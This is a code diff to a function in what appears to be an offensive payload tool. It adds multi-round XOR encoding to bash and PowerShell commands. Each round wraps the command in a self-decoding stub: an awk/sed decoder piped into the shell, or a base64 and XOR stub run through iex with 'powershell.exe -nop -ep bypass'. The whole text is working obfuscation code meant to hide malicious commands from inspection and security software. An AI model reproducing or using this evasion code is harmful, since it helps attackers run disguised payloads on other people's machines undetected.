@@ -87,23 +87,25 @@ def xor_wrapper(name, code, args, shell="/bin/bash"):
         shell = args.shell
     if "powershell" not in name.lower():
         if "windows" not in name.lower():
-            code = """s="";for x in $(echo {0}|sed "s/../&\\n/g"); do s=$s$(echo -e $(awk "BEGIN {{printf \\"%x\\n\\", xor(0x$x, {1})}}"|sed "s/../\\\\\\\\x&/g"));done;echo $s|{2}""".format(hexlify(xor(code, args.xor)), hex(args.xor), shell)
-            code = shell + " -c '" + code + "'"
+            for x in range(args.xor_rounds):
+                code = """s="";for x in $(echo {0}|sed "s/../&\\n/g"); do s=$s$(echo -e $(awk "BEGIN {{printf \\"%x\\n\\", xor(0x$x, {1})}}"|sed "s/../\\\\\\\\x&/g"));done;echo $s|{2}""".format(hexlify(xor(code, args.xor)), hex(args.xor), shell)
+                code = shell + " -c '" + code + "'"
     else:
         # Improved code in 0.3.6
-        if "-Command" in code:
-            prefix, xcode = code.split("-Command")
-        else:
-            prefix = "powershell.exe -nop -ep bypass "
-            xcode = code
-        pcode = xcode.replace('"', "")
-        #pcode = pcode.replace("\\", '\\"')
-        
-        code = to_unicode(pcode)  # String to Unicode
-        code = xor(code, args.xor)  # XOR encode using random key <--
-        code = powershell_base64(code, unicode_encoding=False) # We need it in base64 because it is binary
-        code = """ $k={0};$b='{1}';$d=[Convert]::FromBase64String($b);$dd=foreach($byte in $d) {{$byte -bxor $k}};$dm=[System.Text.Encoding]::Unicode.GetString($dd);iex $dm""".format(args.xor, code) # Decryption stub
-        code = prefix + "-Command " + '"%s"' % code
+        for x in range(args.xor_rounds):
+            if "-Command" in code:
+                prefix, xcode = code.split("-Command")
+            else:
+                prefix = "powershell.exe -nop -ep bypass "
+                xcode = code
+            pcode = xcode.replace('"', "")
+            #pcode = pcode.replace("\\", '\\"')
+            
+            code = to_unicode(pcode)  # String to Unicode
+            code = xor(code, args.xor)  # XOR encode using random key <--
+            code = powershell_base64(code, unicode_encoding=False) # We need it in base64 because it is binary
+            code = """ $k={0};$b='{1}';$d=[Convert]::FromBase64String($b);$dd=foreach($byte in $d) {{$byte -bxor $k}};$dm=[System.Text.Encoding]::Unicode.GetString($dd);iex $dm""".format(args.xor, code) # Decryption stub
+            code = prefix + "-Command " + '"%s"' % code
     return code
 
 
